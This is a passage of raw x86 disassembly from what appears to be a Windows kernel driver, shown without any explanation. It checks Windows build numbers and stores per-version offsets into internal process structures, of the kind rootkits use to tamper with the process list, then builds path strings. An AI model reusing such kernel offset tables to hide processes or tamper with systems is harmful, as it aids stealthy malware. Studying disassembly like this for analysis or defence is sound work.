   181d8:	mov    DWORD PTR [ebp-0x638],0x18
   181e2:	mov    DWORD PTR [ebp-0x634],ebx
   181e8:	mov    DWORD PTR [ebp-0x62c],0x200
   181f2:	mov    DWORD PTR [ebp-0x628],ebx
   181f8:	mov    DWORD PTR [ebp-0x624],ebx
   181fe:	call   edi
   18200:	test   eax,eax
   18202:	jne    0x1818b
   18204:	mov    esi,0x220
   18209:	push   esi
   1820a:	push   0x1
   1820c:	call   DWORD PTR ds:0x1b124
   18212:	mov    edi,eax
   18214:	cmp    edi,ebx
   18216:	je     0x18296
   18218:	push   0x218
   1821d:	push   ebx
   1821e:	push   edi
   1821f:	call   0x1a1b0
   18224:	add    esp,0xc
   18227:	push   0x5
   18229:	push   0x218
   1822e:	push   edi
   1822f:	lea    eax,[ebp-0x64c]
   18235:	push   eax
   18236:	push   DWORD PTR [ebp-0x620]
   1823c:	call   DWORD PTR ds:0x1b24c
   18242:	test   eax,eax
   18244:	jne    0x18262
   18246:	lea    eax,[edi+0xc]
   18249:	push   0x1b020
   1824e:	push   eax
   1824f:	call   DWORD PTR ds:0x1b168
   18255:	neg    eax
   18257:	sbb    al,al
   18259:	pop    ecx
   1825a:	inc    al
   1825c:	pop    ecx
   1825d:	mov    ds:0x1bf8c,al
   18262:	push   esi
   18263:	push   ebx
   18264:	push   edi
   18265:	mov    DWORD PTR [ebp-0x644],edi
   1826b:	call   0x1a1b0
   18270:	add    esp,0xc
   18273:	push   0x1
   18275:	push   esi
   18276:	push   edi
   18277:	lea    eax,[ebp-0x64c]
   1827d:	push   eax
   1827e:	push   DWORD PTR [ebp-0x620]
   18284:	call   DWORD PTR ds:0x1b24c
   1828a:	push   ebx
   1828b:	push   edi
   1828c:	mov    esi,eax
   1828e:	call   DWORD PTR ds:0x1b278
   18294:	jmp    0x1829b
   18296:	mov    esi,0xc0000001
   1829b:	push   DWORD PTR [ebp-0x620]
   182a1:	call   DWORD PTR ds:0x1b180
   182a7:	cmp    esi,ebx
   182a9:	jne    0x18d10
   182af:	mov    esi,0x208
   182b4:	push   esi
   182b5:	lea    eax,[ebp-0x61c]
   182bb:	push   ebx
   182bc:	push   eax
   182bd:	call   0x1a1b0
   182c2:	mov    eax,DWORD PTR [ebp-0x644]
   182c8:	push   DWORD PTR [eax+0x8]
   182cb:	lea    eax,[ebp-0x61c]
   182d1:	push   0x1b01a
   182d6:	push   eax
   182d7:	call   DWORD PTR ds:0x1b1b8
   182dd:	mov    eax,ds:0x1b248
   182e2:	movzx  eax,WORD PTR [eax]
   182e5:	add    esp,0x18
   182e8:	cmp    eax,0x893
   182ed:	je     0x183a3
   182f3:	cmp    eax,0xa28
   182f8:	jne    0x18468
   182fe:	lea    eax,[esi-0x58]
   18301:	mov    BYTE PTR ds:0x1bf91,0x1
   18308:	mov    DWORD PTR ds:0x1bfa8,0x84
   18312:	mov    DWORD PTR ds:0x1bfac,0x88
   1831c:	mov    DWORD PTR ds:0x1bfb0,0x174
   18326:	mov    DWORD PTR ds:0x1bf80,0xc4
   18330:	mov    DWORD PTR ds:0x1bf84,0x10486
   1833a:	mov    DWORD PTR ds:0x1c050,0x74
   18344:	mov    DWORD PTR ds:0x1c054,0x112
   1834e:	mov    DWORD PTR ds:0x1c058,0x80
   18358:	mov    DWORD PTR ds:0x1c05c,0x25
   18362:	mov    DWORD PTR ds:0x1c060,0x7a
   1836c:	mov    DWORD PTR ds:0x1c064,0x91
   18376:	mov    DWORD PTR ds:0x1c0a0,0x9b
   18380:	mov    ds:0x1bfe0,eax
   18385:	mov    DWORD PTR ds:0x1bff4,0x22c
   1838f:	mov    DWORD PTR ds:0x1bfec,0x1f0
   18399:	mov    ds:0x1bff8,eax
   1839e:	jmp    0x1844a
   183a3:	mov    BYTE PTR ds:0x1bf92,0x1
   183aa:	mov    DWORD PTR ds:0x1bfa8,0x9c
   183b4:	mov    DWORD PTR ds:0x1bfac,0xa0
   183be:	mov    DWORD PTR ds:0x1bfb0,0x1fc
   183c8:	mov    DWORD PTR ds:0x1bf80,0x128
   183d2:	mov    DWORD PTR ds:0x1bf84,0x104f8
   183dc:	mov    DWORD PTR ds:0x1c050,0x64
   183e6:	mov    DWORD PTR ds:0x1c054,0xed
   183f0:	mov    DWORD PTR ds:0x1c058,0x6f
   183fa:	mov    DWORD PTR ds:0x1c05c,0x20
   18404:	mov    DWORD PTR ds:0x1c060,0x6a
   1840e:	mov    DWORD PTR ds:0x1c064,0x7d
   18418:	mov    DWORD PTR ds:0x1c0a0,0x87
   18422:	mov    DWORD PTR ds:0x1bfe0,0x1b0
   1842c:	mov    DWORD PTR ds:0x1bff4,0x240
   18436:	mov    DWORD PTR ds:0x1bfec,0x1e4
   18440:	mov    DWORD PTR ds:0x1bff8,0x1a4
   1844a:	mov    DWORD PTR ds:0x1bfe4,0x2d
   18454:	mov    DWORD PTR ds:0x1bfe8,0x28
   1845e:	mov    DWORD PTR ds:0x1bff0,0x50
   18468:	push   0x1
   1846a:	push   0x1d2e8
   1846f:	push   0x1c788
   18474:	call   0x12372
   18479:	cmp    eax,ebx
   1847b:	jne    0x18d20
   18481:	push   esi
   18482:	lea    eax,[ebp-0x414]
   18488:	push   ebx
   18489:	push   eax
   1848a:	call   0x1a1b0
   1848f:	push   esi
   18490:	lea    eax,[ebp-0x20c]
   18496:	push   ebx
   18497:	push   eax
   18498:	call   0x1a1b0
   1849d:	add    esp,0x18
   184a0:	push   ebx
   184a1:	push   DWORD PTR ds:0x1c78c
   184a7:	mov    edi,0x104
   184ac:	push   edi
   184ad:	lea    eax,[ebp-0x414]
   184b3:	push   eax
   184b4:	call   0x13102
   184b9:	push   ebx
   184ba:	push   DWORD PTR ds:0x1d2ec
   184c0:	lea    eax,[ebp-0x20c]
   184c6:	push   edi
   184c7:	push   eax
   184c8:	call   0x13102
   184cd:	push   esi
   184ce:	push   ebx
   184cf:	push   0x1ca20
   184d4:	call   0x1a1b0
   184d9:	push   esi
   184da:	push   ebx
   184db:	push   0x1d960
   184e0:	call   0x1a1b0
   184e5:	push   esi
   184e6:	push   ebx
   184e7:	push   0x1d0e0
   184ec:	call   0x1a1b0
   184f1:	push   esi
   184f2:	push   ebx
   184f3:	mov    edi,0x1db80
   184f8:	push   edi
   184f9:	call   0x1a1b0
   184fe:	push   esi
   184ff:	push   ebx
   18500:	push   0x1c580
   18505:	call   0x1a1b0
   1850a:	push   esi
   1850b:	push   ebx
   1850c:	push   0x1d740
   18511:	call   0x1a1b0
   18516:	add    esp,0x48
   18519:	push   esi
   1851a:	push   ebx
   1851b:	push   0x1c120
   18520:	call   0x1a1b0
   18525:	push   esi
   18526:	push   ebx
   18527:	push   0x1c360
   1852c:	call   0x1a1b0
   18531:	push   esi
   18532:	push   ebx
   18533:	push   0x1d520
   18538:	call   0x1a1b0
   1853d:	push   esi
   1853e:	push   ebx
   1853f:	push   0x1c7a0
   18544:	call   0x1a1b0
   18549:	push   esi
   1854a:	push   ebx
   1854b:	push   0x1cc40
   18550:	call   0x1a1b0
   18555:	push   esi
   18556:	push   ebx
   18557:	push   0x1ce60
   1855c:	call   0x1a1b0
   18561:	add    esp,0x48
   18564:	push   esi
   18565:	push   ebx
   18566:	push   0x1d300
   1856b:	call   0x1a1b0
   18570:	add    esp,0xc
   18573:	xor    eax,eax
   18575:	movzx  ecx,WORD PTR [ebp+eax*1-0x414]
   1857d:	mov    WORD PTR [eax+0x1db80],cx
   18584:	inc    eax
   18585:	inc    eax
   18586:	cmp    cx,bx
   18589:	jne    0x18575
   1858b:	dec    edi
   1858c:	dec    edi
   1858d:	mov    ax,WORD PTR [edi+0x2]
   18591:	inc    edi
   18592:	inc    edi
   18593:	cmp    ax,bx
   18596:	jne    0x1858d
   18598:	mov    esi,0x1abce
   1859d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1859e:	mov    edi,0x1db80
   185a3:	dec    edi
   185a4:	dec    edi
   185a5:	mov    ax,WORD PTR [edi+0x2]
   185a9:	inc    edi
   185aa:	inc    edi
   185ab:	cmp    ax,bx
   185ae:	jne    0x185a5
   185b0:	push   0x6
   185b2:	mov    edx,0x1a6aa
   185b7:	pop    ecx
   185b8:	mov    esi,edx
   185ba:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   185bc:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   185be:	xor    eax,eax
   185c0:	movzx  ecx,WORD PTR [ebp+eax*1-0x20c]
   185c8:	mov    WORD PTR [eax+0x1c580],cx
   185cf:	inc    eax
   185d0:	inc    eax
   185d1:	cmp    cx,bx
   185d4:	jne    0x185c0
   185d6:	mov    eax,0x1c580
   185db:	mov    edi,eax
   185dd:	dec    edi
   185de:	dec    edi
   185df:	mov    cx,WORD PTR [edi+0x2]
   185e3:	inc    edi
   185e4:	inc    edi
   185e5:	cmp    cx,bx
   185e8:	jne    0x185df
   185ea:	push   0x5
   185ec:	pop    ecx
   185ed:	mov    esi,0x1b004
   185f2:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   185f4:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   185f6:	mov    edi,eax
   185f8:	dec    edi
   185f9:	dec    edi
   185fa:	mov    ax,WORD PTR [edi+0x2]
   185fe:	inc    edi
   185ff:	inc    edi
   18600:	cmp    ax,bx
   18603:	jne    0x185fa
   18605:	push   0x6
   18607:	pop    ecx
   18608:	mov    esi,edx
   1860a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1860c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   1860e:	xor    eax,eax
   18610:	movzx  ecx,WORD PTR [ebp+eax*1-0x20c]
   18618:	mov    WORD PTR [eax+0x1d740],cx
   1861f:	inc    eax
   18620:	inc    eax
   18621:	cmp    cx,bx
   18624:	jne    0x18610
   18626:	mov    eax,0x1d740
   1862b:	mov    edi,eax
   1862d:	dec    edi
   1862e:	dec    edi
   1862f:	mov    cx,WORD PTR [edi+0x2]
   18633:	inc    edi
   18634:	inc    edi
   18635:	cmp    cx,bx
   18638:	jne    0x1862f
   1863a:	mov    esi,0x1abce
   1863f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18640:	mov    edi,eax
   18642:	dec    edi
   18643:	dec    edi
   18644:	mov    ax,WORD PTR [edi+0x2]
   18648:	inc    edi
   18649:	inc    edi
   1864a:	cmp    ax,bx
   1864d:	jne    0x18644
   1864f:	push   0x6
   18651:	mov    edx,0x1afea
   18656:	pop    ecx
   18657:	mov    esi,edx
   18659:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1865b:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   1865d:	xor    eax,eax
   1865f:	movzx  ecx,WORD PTR [ebp+eax*1-0x20c]
   18667:	mov    WORD PTR [eax+0x1c120],cx
   1866e:	inc    eax
   1866f:	inc    eax
   18670:	cmp    cx,bx
   18673:	jne    0x1865f
   18675:	mov    eax,0x1c120
   1867a:	mov    edi,eax
   1867c:	dec    edi
   1867d:	dec    edi
   1867e:	mov    cx,WORD PTR [edi+0x2]
   18682:	inc    edi
   18683:	inc    edi
   18684:	cmp    cx,bx
   18687:	jne    0x1867e
   18689:	push   0x5
   1868b:	pop    ecx
   1868c:	mov    esi,0x1b004
   18691:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18693:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   18695:	mov    edi,eax
   18697:	dec    edi
   18698:	dec    edi
   18699:	mov    ax,WORD PTR [edi+0x2]
   1869d:	inc    edi
   1869e:	inc    edi
   1869f:	cmp    ax,bx
   186a2:	jne    0x18699
   186a4:	push   0x6
   186a6:	pop    ecx
   186a7:	mov    esi,edx
   186a9:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   186ab:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   186ad:	xor    eax,eax
   186af:	movzx  ecx,WORD PTR [ebp+eax*1-0x20c]
   186b7:	mov    WORD PTR [eax+0x1c7a0],cx
   186be:	inc    eax
   186bf:	inc    eax
   186c0:	cmp    cx,bx
   186c3:	jne    0x186af
   186c5:	mov    eax,0x1c7a0
   186ca:	mov    edi,eax
   186cc:	dec    edi
   186cd:	dec    edi
   186ce:	mov    cx,WORD PTR [edi+0x2]
   186d2:	inc    edi
   186d3:	inc    edi
   186d4:	cmp    cx,bx
   186d7:	jne    0x186ce
   186d9:	mov    esi,0x1abce
   186de:	mov    ecx,0x1b680
   186e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   186e4:	mov    edx,ecx
   186e6:	mov    si,WORD PTR [ecx]
   186e9:	inc    ecx
   186ea:	inc    ecx
   186eb:	cmp    si,bx
   186ee:	jne    0x186e6
   186f0:	sub    ecx,edx
   186f2:	mov    edi,eax
   186f4:	dec    edi
   186f5:	mov    esi,edx
   186f7:	mov    edx,ecx
   186f9:	dec    edi
   186fa:	mov    ax,WORD PTR [edi+0x2]
   186fe:	inc    edi
   186ff:	inc    edi
   18700:	cmp    ax,bx
   18703:	jne    0x186fa
   18705:	mov    ecx,edx
   18707:	shr    ecx,0x2
   1870a:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1870c:	mov    ecx,edx
   1870e:	and    ecx,0x3
   18711:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18713:	xor    ecx,ecx
   18715:	movzx  esi,WORD PTR [ebp+ecx*1-0x20c]
   1871d:	mov    WORD PTR [ecx+0x1cc40],si
   18724:	inc    ecx
   18725:	inc    ecx
   18726:	cmp    si,bx
   18729:	jne    0x18715
   1872b:	mov    edx,0x1cc40
   18730:	mov    edi,edx
   18732:	dec    edi
   18733:	dec    edi
   18734:	mov    ax,WORD PTR [edi+0x2]
   18738:	inc    edi
   18739:	inc    edi
   1873a:	cmp    ax,bx
   1873d:	jne    0x18734
   1873f:	push   0x5
   18741:	pop    ecx
   18742:	mov    esi,0x1b004
   18747:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18749:	mov    eax,0x1b680
   1874e:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   18750:	mov    esi,eax
   18752:	mov    cx,WORD PTR [eax]
   18755:	inc    eax
   18756:	inc    eax
   18757:	cmp    cx,bx
   1875a:	jne    0x18752
   1875c:	sub    eax,esi
   1875e:	mov    edi,edx
   18760:	dec    edi
   18761:	dec    edi
   18762:	mov    cx,WORD PTR [edi+0x2]
   18766:	inc    edi
   18767:	inc    edi
   18768:	cmp    cx,bx
   1876b:	jne    0x18762
   1876d:	mov    ecx,eax
   1876f:	shr    ecx,0x2
   18772:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18774:	mov    ecx,eax
   18776:	and    ecx,0x3
   18779:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1877b:	xor    eax,eax
   1877d:	movzx  ecx,WORD PTR [ebp+eax*1-0x20c]
   18785:	mov    WORD PTR [eax+0x1ca20],cx
   1878c:	inc    eax
   1878d:	inc    eax
   1878e:	cmp    cx,bx
   18791:	jne    0x1877d
   18793:	mov    eax,0x1ca20
   18798:	mov    edi,eax
   1879a:	dec    edi
   1879b:	dec    edi
   1879c:	mov    cx,WORD PTR [edi+0x2]
   187a0:	inc    edi
   187a1:	inc    edi
   187a2:	cmp    cx,bx
   187a5:	jne    0x1879c
   187a7:	push   0x5
   187a9:	pop    ecx
   187aa:	mov    esi,0x1afd6
   187af:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   187b1:	mov    edi,eax
   187b3:	dec    edi
   187b4:	dec    edi
   187b5:	mov    ax,WORD PTR [edi+0x2]
   187b9:	inc    edi
   187ba:	inc    edi
   187bb:	cmp    ax,bx
   187be:	jne    0x187b5
   187c0:	mov    edx,0x1af46
   187c5:	mov    esi,edx
   187c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   187c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   187c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   187ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   187cb:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   187cd:	xor    eax,eax
   187cf:	movzx  ecx,WORD PTR [ebp+eax*1-0x20c]
   187d7:	mov    WORD PTR [eax+0x1d0e0],cx
   187de:	inc    eax
   187df:	inc    eax
   187e0:	cmp    cx,bx
   187e3:	jne    0x187cf
   187e5:	mov    eax,0x1d0e0
   187ea:	mov    edi,eax
   187ec:	dec    edi
   187ed:	dec    edi
   187ee:	mov    cx,WORD PTR [edi+0x2]
   187f2:	inc    edi
   187f3:	inc    edi
   187f4:	cmp    cx,bx
   187f7:	jne    0x187ee
   187f9:	push   0x5
   187fb:	pop    ecx
   187fc:	mov    esi,0x1b004
   18801:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18803:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   18805:	mov    edi,eax
   18807:	dec    edi
   18808:	dec    edi
   18809:	mov    ax,WORD PTR [edi+0x2]
   1880d:	inc    edi
   1880e:	inc    edi
   1880f:	cmp    ax,bx
   18812:	jne    0x18809
   18814:	mov    esi,edx
   18816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18817:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18819:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1881a:	push   0x2
   1881c:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   1881e:	xor    eax,eax
   18820:	pop    edx
   18821:	movzx  ecx,WORD PTR [ebp+eax*1-0x20c]
   18829:	mov    WORD PTR [eax+0x1d960],cx
   18830:	add    eax,edx
   18832:	cmp    cx,bx
   18835:	jne    0x18821
   18837:	mov    edi,0x1d960
   1883c:	dec    edi
   1883d:	dec    edi
   1883e:	mov    ax,WORD PTR [edi+0x2]
   18842:	add    edi,edx
   18844:	cmp    ax,bx
   18847:	jne    0x1883e
   18849:	push   0x9
   1884b:	pop    ecx
   1884c:	mov    esi,0x1afb0
   18851:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18853:	xor    eax,eax
   18855:	cmp    BYTE PTR ds:0x1bf8c,bl
   1885b:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
   1885d:	je     0x189e9
   18863:	movzx  ecx,WORD PTR [eax+0x1c7a0]
   1886a:	mov    WORD PTR [eax+0x1c360],cx
   18871:	add    eax,edx
   18873:	cmp    cx,bx
   18876:	jne    0x18863
   18878:	mov    eax,0x1c360
   1887d:	mov    edi,eax
   1887f:	dec    edi
   18880:	dec    edi
   18881:	mov    cx,WORD PTR [edi+0x2]
   18885:	add    edi,edx
   18887:	cmp    cx,bx
   1888a:	jne    0x18881
   1888c:	mov    esi,0x1afac
   18891:	mov    ecx,0x1b69c
   18896:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18897:	mov    edi,ecx
   18899:	mov    si,WORD PTR [ecx]
   1889c:	add    ecx,edx
   1889e:	cmp    si,bx
   188a1:	jne    0x18899
   188a3:	sub    ecx,edi
   188a5:	mov    esi,edi
   188a7:	mov    edi,eax
   188a9:	dec    edi
   188aa:	mov    edx,ecx
   188ac:	dec    edi
   188ad:	mov    ax,WORD PTR [edi+0x2]
   188b1:	inc    edi
   188b2:	inc    edi
   188b3:	cmp    ax,bx
   188b6:	jne    0x188ad
   188b8:	mov    ecx,edx
   188ba:	shr    ecx,0x2
   188bd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   188bf:	mov    ecx,edx
   188c1:	and    ecx,0x3
   188c4:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   188c6:	xor    ecx,ecx
   188c8:	movzx  esi,WORD PTR [ecx+0x1cc40]
   188cf:	mov    WORD PTR [ecx+0x1d520],si
   188d6:	inc    ecx
   188d7:	inc    ecx
   188d8:	cmp    si,bx
   188db:	jne    0x188c8
   188dd:	mov    ecx,0x1d520
   188e2:	mov    edi,ecx
   188e4:	dec    edi
   188e5:	push   0x2
   188e7:	dec    edi
   188e8:	pop    edx
   188e9:	mov    ax,WORD PTR [edi+0x2]
   188ed:	add    edi,edx
   188ef:	cmp    ax,bx
   188f2:	jne    0x188e9
   188f4:	mov    esi,0x1afac
   188f9:	mov    eax,0x1b69c
   188fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   188ff:	mov    edi,eax
   18901:	mov    si,WORD PTR [eax]
   18904:	add    eax,edx
   18906:	cmp    si,bx
   18909:	jne    0x18901
   1890b:	sub    eax,edi
   1890d:	mov    esi,edi
   1890f:	mov    edi,ecx
   18911:	dec    edi
   18912:	dec    edi
   18913:	mov    cx,WORD PTR [edi+0x2]
   18917:	add    edi,edx
   18919:	cmp    cx,bx
   1891c:	jne    0x18913
   1891e:	mov    ecx,eax
   18920:	shr    ecx,0x2
   18923:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18925:	mov    ecx,eax
   18927:	and    ecx,0x3
   1892a:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1892c:	xor    eax,eax
   1892e:	movzx  ecx,WORD PTR [eax+0x1c7a0]
   18935:	mov    WORD PTR [eax+0x1ce60],cx
   1893c:	add    eax,edx
   1893e:	cmp    cx,bx
   18941:	jne    0x1892e
   18943:	mov    ecx,0x1ce60
   18948:	mov    edi,ecx
   1894a:	dec    edi
   1894b:	dec    edi
   1894c:	mov    ax,WORD PTR [edi+0x2]
   18950:	add    edi,edx
   18952:	cmp    ax,bx
   18955:	jne    0x1894c
   18957:	mov    esi,0x1afac
   1895c:	mov    eax,0x1b704
   18961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18962:	mov    edi,eax
   18964:	mov    si,WORD PTR [eax]
   18967:	add    eax,edx
   18969:	cmp    si,bx
   1896c:	jne    0x18964
   1896e:	sub    eax,edi
   18970:	mov    esi,edi
   18972:	mov    edi,ecx
   18974:	dec    edi
   18975:	dec    edi
   18976:	mov    cx,WORD PTR [edi+0x2]
   1897a:	add    edi,edx
   1897c:	cmp    cx,bx
   1897f:	jne    0x18976
   18981:	mov    ecx,eax
   18983:	shr    ecx,0x2
   18986:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18988:	mov    ecx,eax
   1898a:	and    ecx,0x3
   1898d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1898f:	xor    eax,eax
   18991:	movzx  ecx,WORD PTR [eax+0x1c7a0]
   18998:	mov    WORD PTR [eax+0x1d300],cx
   1899f:	add    eax,edx
   189a1:	cmp    cx,bx
   189a4:	jne    0x18991
   189a6:	mov    ecx,0x1d300
   189ab:	mov    edi,ecx
   189ad:	dec    edi
   189ae:	dec    edi
   189af:	mov    ax,WORD PTR [edi+0x2]
   189b3:	add    edi,edx
   189b5:	cmp    ax,bx
   189b8:	jne    0x189af
   189ba:	mov    esi,0x1afac
   189bf:	mov    eax,0x1b6d4
   189c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   189c5:	mov    edi,eax
   189c7:	mov    si,WORD PTR [eax]
   189ca:	add    eax,edx
   189cc:	cmp    si,bx
   189cf:	jne    0x189c7
   189d1:	sub    eax,edi
   189d3:	mov    esi,edi
   189d5:	mov    edi,ecx
   189d7:	dec    edi
   189d8:	dec    edi
   189d9:	mov    cx,WORD PTR [edi+0x2]
   189dd:	add    edi,edx
   189df:	cmp    cx,bx
   189e2:	jne    0x189d9
   189e4:	jmp    0x18b6e
   189e9:	movzx  ecx,WORD PTR [ebp+eax*1-0x20c]
   189f1:	mov    WORD PTR [eax+0x1c360],cx
   189f8:	add    eax,edx
   189fa:	cmp    cx,bx
   189fd:	jne    0x189e9
   189ff:	mov    eax,0x1c360
   18a04:	mov    edi,eax
   18a06:	dec    edi
   18a07:	dec    edi
   18a08:	mov    cx,WORD PTR [edi+0x2]
   18a0c:	add    edi,edx
   18a0e:	cmp    cx,bx
   18a11:	jne    0x18a08
   18a13:	mov    esi,0x1abce
   18a18:	mov    ecx,0x1b6bc
   18a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18a1e:	mov    edi,ecx
   18a20:	mov    si,WORD PTR [ecx]
   18a23:	add    ecx,edx
   18a25:	cmp    si,bx
   18a28:	jne    0x18a20
   18a2a:	sub    ecx,edi
   18a2c:	mov    esi,edi
   18a2e:	mov    edi,eax
   18a30:	dec    edi
   18a31:	mov    edx,ecx
   18a33:	dec    edi
   18a34:	mov    ax,WORD PTR [edi+0x2]
   18a38:	inc    edi
   18a39:	inc    edi
   18a3a:	cmp    ax,bx
   18a3d:	jne    0x18a34
   18a3f:	mov    ecx,edx
   18a41:	shr    ecx,0x2
   18a44:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18a46:	mov    ecx,edx
   18a48:	and    ecx,0x3
   18a4b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18a4d:	xor    ecx,ecx
   18a4f:	movzx  esi,WORD PTR [ebp+ecx*1-0x20c]
   18a57:	mov    WORD PTR [ecx+0x1d520],si
   18a5e:	inc    ecx
   18a5f:	inc    ecx
   18a60:	cmp    si,bx
   18a63:	jne    0x18a4f
   18a65:	mov    ecx,0x1d520
   18a6a:	mov    edi,ecx
   18a6c:	dec    edi
   18a6d:	push   0x2
   18a6f:	dec    edi
   18a70:	pop    edx
   18a71:	mov    ax,WORD PTR [edi+0x2]
   18a75:	add    edi,edx
   18a77:	cmp    ax,bx
   18a7a:	jne    0x18a71
   18a7c:	mov    esi,0x1abce
   18a81:	mov    eax,0x1b6bc
   18a86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18a87:	mov    edi,eax
   18a89:	mov    si,WORD PTR [eax]
   18a8c:	add    eax,edx
   18a8e:	cmp    si,bx
   18a91:	jne    0x18a89
   18a93:	sub    eax,edi
   18a95:	mov    esi,edi
   18a97:	mov    edi,ecx
   18a99:	dec    edi
   18a9a:	dec    edi
   18a9b:	mov    cx,WORD PTR [edi+0x2]
   18a9f:	add    edi,edx
   18aa1:	cmp    cx,bx
   18aa4:	jne    0x18a9b
   18aa6:	mov    ecx,eax
   18aa8:	shr    ecx,0x2
   18aab:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18aad:	mov    ecx,eax
   18aaf:	and    ecx,0x3
   18ab2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18ab4:	xor    eax,eax
   18ab6:	movzx  ecx,WORD PTR [ebp+eax*1-0x20c]
   18abe:	mov    WORD PTR [eax+0x1ce60],cx
   18ac5:	add    eax,edx
   18ac7:	cmp    cx,bx
   18aca:	jne    0x18ab6
   18acc:	mov    ecx,0x1ce60
   18ad1:	mov    edi,ecx
   18ad3:	dec    edi
   18ad4:	dec    edi
   18ad5:	mov    ax,WORD PTR [edi+0x2]
   18ad9:	add    edi,edx
   18adb:	cmp    ax,bx
   18ade:	jne    0x18ad5
   18ae0:	mov    esi,0x1abce
   18ae5:	mov    eax,0x1b724
   18aea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18aeb:	mov    edi,eax
   18aed:	mov    si,WORD PTR [eax]
   18af0:	add    eax,edx
   18af2:	cmp    si,bx
   18af5:	jne    0x18aed
   18af7:	sub    eax,edi
   18af9:	mov    esi,edi
   18afb:	mov    edi,ecx
   18afd:	dec    edi
   18afe:	dec    edi
   18aff:	mov    cx,WORD PTR [edi+0x2]
   18b03:	add    edi,edx
   18b05:	cmp    cx,bx
   18b08:	jne    0x18aff
   18b0a:	mov    ecx,eax
   18b0c:	shr    ecx,0x2
   18b0f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18b11:	mov    ecx,eax
   18b13:	and    ecx,0x3
   18b16:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18b18:	xor    eax,eax
   18b1a:	movzx  ecx,WORD PTR [ebp+eax*1-0x20c]
   18b22:	mov    WORD PTR [eax+0x1d300],cx
   18b29:	add    eax,edx
   18b2b:	cmp    cx,bx
   18b2e:	jne    0x18b1a
   18b30:	mov    ecx,0x1d300
   18b35:	mov    edi,ecx
   18b37:	dec    edi
   18b38:	dec    edi
   18b39:	mov    ax,WORD PTR [edi+0x2]
   18b3d:	add    edi,edx
   18b3f:	cmp    ax,bx
   18b42:	jne    0x18b39
   18b44:	mov    esi,0x1abce
   18b49:	mov    eax,0x1b6ec
   18b4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18b4f:	mov    edi,eax
   18b51:	mov    si,WORD PTR [eax]
   18b54:	add    eax,edx
   18b56:	cmp    si,bx
   18b59:	jne    0x18b51
   18b5b:	sub    eax,edi
   18b5d:	mov    esi,edi
   18b5f:	mov    edi,ecx
   18b61:	dec    edi
   18b62:	dec    edi
   18b63:	mov    cx,WORD PTR [edi+0x2]
   18b67:	add    edi,edx
   18b69:	cmp    cx,bx
   18b6c:	jne    0x18b63
   18b6e:	mov    ecx,eax
   18b70:	shr    ecx,0x2
   18b73:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   18b75:	mov    ecx,eax
   18b77:	movzx  eax,WORD PTR ds:0x1c792
   18b7e:	push   eax
   18b7f:	push   ebx
   18b80:	push   DWORD PTR ds:0x1c794
   18b86:	and    ecx,0x3
   18b89:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
   18b8b:	call   0x1a1b0
   18b90:	mov    esi,DWORD PTR ds:0x1b280
   18b96:	add    esp,0xc
   18b99:	lea    eax,[ebp-0x61c]
   18b9f:	push   eax
   18ba0:	push   0x1c790
   18ba5:	call   esi
